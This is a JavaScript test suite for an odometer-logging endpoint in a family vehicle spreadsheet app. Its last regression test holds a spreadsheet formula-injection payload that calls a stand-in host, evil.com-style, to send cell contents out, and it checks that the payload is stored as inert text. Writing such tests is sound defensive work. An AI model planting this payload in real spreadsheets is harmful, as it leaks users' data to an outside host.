'use strict';
process.env.TZ = process.env.TZ || 'America/Chicago';

const test = require('node:test');
const assert = require('node:assert/strict');
const fx = require('./fixtures/sheet');
const { loadApi } = require('./fakes-services');

const R4 = fx.vehicleNames.fourRunner;  // Latest Odometer 37,320 on 2026-09-15; Est. Current Mileage 37,704
const plain = x => JSON.parse(JSON.stringify(x));

function setup() {
  const env = loadApi({ tabs: fx.cloneTabs() });
  const { gas } = env;
  env.today = gas.nowParts_().ymd;
  env.ctx = gas.requireUser_(gas.issueSession_('leo@example.com', Math.floor(Date.now() / 1000)).token);
  env.add = (params) => plain(gas.addOdometer_(env.ctx, params));
  env.sheet = env.fakes.spreadsheet.getSheetByName('Odometer Readings');
  env.rows = () => {
    const [h, ...rows] = env.sheet.toValues();
    return rows.map(r => Object.fromEntries(h.map((k, i) => [k, r[i]])));
  };
  return env;
}

function apiErr(fn) {
  try {
    fn();
  } catch (e) {
    assert.ok(e.apiError, 'expected an apiError_, got ' + (e && e.stack));
    return { status: e.status, error: e.error, message: e.message,
      detail: e.detail === undefined ? undefined : JSON.parse(JSON.stringify(e.detail)) };
  }
  assert.fail('expected an error');
}

test('addOdometer_ appends a reading (Date at noon, Entered By = Name) and refreshes the bootstrap cache', () => {
  const env = setup();
  const cacheKey = env.gas.bootstrapCacheKey_();
  env.fakes.scriptCache.put(cacheKey, '{"id":"x","n":1}', 300);

  const res = env.add({ vehicle: R4, mileage: 37500, clientId: 'phone-odo-1', note: '  Before the trip ' });
  assert.equal(res.latestOdometer, 37500);
  assert.equal(res.latestOdometerDate, env.today);
  assert.equal(res.reading.readingId, 'phone-odo-1');
  assert.equal(res.reading.vehicle, R4);
  assert.equal(res.reading.date, env.today);
  assert.equal(res.reading.mileage, 37500);
  assert.equal(res.reading.enteredBy, 'Leo');
  assert.match(res.reading.enteredAt, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}-0[56]:00$/);
  assert.equal(res.reading.note, 'Before the trip');

  const rows = env.rows();
  assert.equal(rows.length, 4);
  const row = rows[3];
  assert.equal(row['Reading ID'], 'phone-odo-1');
  assert.equal(row['Mileage'], 37500);
  assert.equal(row['Entered By'], 'Leo');
  assert.equal(Object.prototype.toString.call(row['Date']), '[object Date]');
  assert.equal(row['Date'].getHours(), 12, 'stored at noon, like the ingestion script');
  assert.equal(env.gas.ymdFromDate_(row['Date']), env.today);
  assert.equal(Object.prototype.toString.call(row['Entered At']), '[object Date]');
  assert.equal(env.fakes.scriptCache.get(cacheKey), null, 'bootstrap cache invalidated');
});

test('addOdometer_: lower than the latest reading → 409 below_latest with that reading', () => {
  const env = setup();
  const e = apiErr(() => env.add({ vehicle: R4, mileage: 37000, clientId: 'c1' }));
  assert.deepEqual(e, {
    status: 409, error: 'below_latest', message: "That's lower than the last reading: 37,320 mi on Sep 15, 2026.",
    detail: { mileage: 37320, date: '2026-09-15' },
  });
  // Equal to the latest is fine.
  assert.equal(env.add({ vehicle: R4, mileage: 37320, clientId: 'c2' }).latestOdometer, 37320);

  // A reading on the tab that the Latest Odometer formula hasn't caught up with still counts.
  env.sheet.appendRow(['other-phone', R4, fx.d('2026-09-20'), 38100, 'Robert', new Date(), '']);
  assert.deepEqual(apiErr(() => env.add({ vehicle: R4, mileage: 38000, clientId: 'c3' })).detail,
    { mileage: 38100, date: '2026-09-20' });
  assert.equal(env.rows().length, 5, 'nothing appended for the refused readings');
});

test('addOdometer_: more than 5,000 above the estimate needs confirmHigh', () => {
  const env = setup();
  const e = apiErr(() => env.add({ vehicle: R4, mileage: 42705, clientId: 'c1' }));
  assert.deepEqual([e.status, e.error, e.detail], [409, 'confirm_high', { estimate: 37704 }]);
  assert.match(e.message, /more than 5,000 miles above the estimate \(about 37,704 mi\)/);
  assert.equal(apiErr(() => env.add({ vehicle: R4, mileage: 42705, clientId: 'c1', confirmHigh: false })).error, 'confirm_high');
  assert.equal(env.add({ vehicle: R4, mileage: 42705, clientId: 'c1', confirmHigh: true }).latestOdometer, 42705);
  // Exactly estimate + 5,000 needs no confirmation.
  const env2 = setup();
  assert.equal(env2.add({ vehicle: R4, mileage: 42704, clientId: 'c2' }).latestOdometer, 42704);
});

test('addOdometer_ is idempotent on clientId (offline retry returns the stored row)', () => {
  const env = setup();
  const first = env.add({ vehicle: R4, mileage: 37400, clientId: 'retry-me', date: '2026-09-20' });
  const again = env.add({ vehicle: R4, mileage: 37400, clientId: 'retry-me', date: '2026-09-20' });
  assert.deepEqual(again, first);
  assert.equal(env.rows().filter(r => r['Reading ID'] === 'retry-me').length, 1);

  // An existing Reading ID comes back as stored, before any other check.
  const stored = env.add({ vehicle: R4, mileage: 1, clientId: 'odo-0003' });
  assert.equal(stored.reading.mileage, 37320);
  assert.equal(stored.reading.note, 'Before a road trip');
  assert.equal(stored.latestOdometer, 37400);
  assert.equal(env.rows().length, 4);
});

test('addOdometer_: dates default to today, may be in the past, never in the future', () => {
  const env = setup();
  const past = env.add({ vehicle: R4, mileage: 37330, clientId: 'p1', date: '2026-09-16' });
  assert.equal(past.reading.date, '2026-09-16');
  const tomorrow = env.gas.addDays_(env.today, 1);
  assert.deepEqual(apiErr(() => env.add({ vehicle: R4, mileage: 37400, clientId: 'f1', date: tomorrow })).message,
    "The date can't be in the future.");
  for (const bad of ['2026-02-30', '2026-13-01', 'yesterday']) {
    assert.equal(apiErr(() => env.add({ vehicle: R4, mileage: 37400, clientId: 'f2', date: bad })).status, 400, bad);
  }
});

test('addOdometer_: vehicle must be active; mileage a whole number from 1 to 999,999', () => {
  const env = setup();
  const vehicles = env.fakes.spreadsheet.getSheetByName('Vehicles');
  const activeCol = vehicles.toValues()[0].indexOf('Active') + 1;
  vehicles.getRange(3, activeCol).setValue('No');  // the Jeep
  for (const vehicle of [fx.vehicleNames.wrangler, 'Batmobile', '']) {
    const e = apiErr(() => env.add({ vehicle, mileage: 90000, clientId: 'v1' }));
    assert.deepEqual([e.status, e.error, e.message], [400, 'bad_request', "Pick one of the family's vehicles."], vehicle);
  }
  for (const mileage of [0, -5, 1000000, 37500.5, NaN]) {
    assert.equal(apiErr(() => env.add({ vehicle: R4, mileage, clientId: 'm1' })).message,
      'Enter the odometer as a whole number of miles.', String(mileage));
  }
});

test('addOdometer through doPost', () => {
  const env = setup();
  const token = env.gas.issueSession_('leo@example.com', Math.floor(Date.now() / 1000)).token;
  const post = body => JSON.parse(env.gas.doPost({ postData: { contents: JSON.stringify(body) } }).getContent());
  const ok = post({ action: 'addOdometer', session: token, vehicle: R4, mileage: 37555, clientId: 'dp-1' });
  assert.equal(ok.ok, true);
  assert.equal(ok.latestOdometer, 37555);
  const low = post({ action: 'addOdometer', session: token, vehicle: R4, mileage: 100, clientId: 'dp-2' });
  assert.deepEqual([low.ok, low.status, low.error, low.detail], [false, 409, 'below_latest', { mileage: 37555, date: env.today }]);
});

test('regression: text from the phone is stored as text, never as a live formula', () => {
  const env = setup();
  const note = '=IMPORTXML("https://evil.example/?q="&A1,"//x")';
  env.add({ vehicle: R4, mileage: 37600, clientId: '+1-phone', note });
  const row = env.rows()[3];
  assert.equal(row['Note'], note, 'the value is the text itself');
  assert.equal(row['Reading ID'], '+1-phone');
  const noteCol = env.sheet.toValues()[0].indexOf('Note') + 1;
  const idCol = env.sheet.toValues()[0].indexOf('Reading ID') + 1;
  assert.equal(env.sheet.getRange(5, noteCol).getFormula(), '', 'no formula in Note');
  assert.equal(env.sheet.getRange(5, idCol).getFormula(), '');
  // What was sent to Sheets carries the apostrophe that forces plain text.
  assert.ok(env.sheet.writes.some(w => w.value === "'" + note));
  // And the retry path still finds it by the same clientId.
  assert.equal(env.add({ vehicle: R4, mileage: 37600, clientId: '+1-phone' }).reading.readingId, '+1-phone');
  assert.equal(env.rows().length, 4);
});
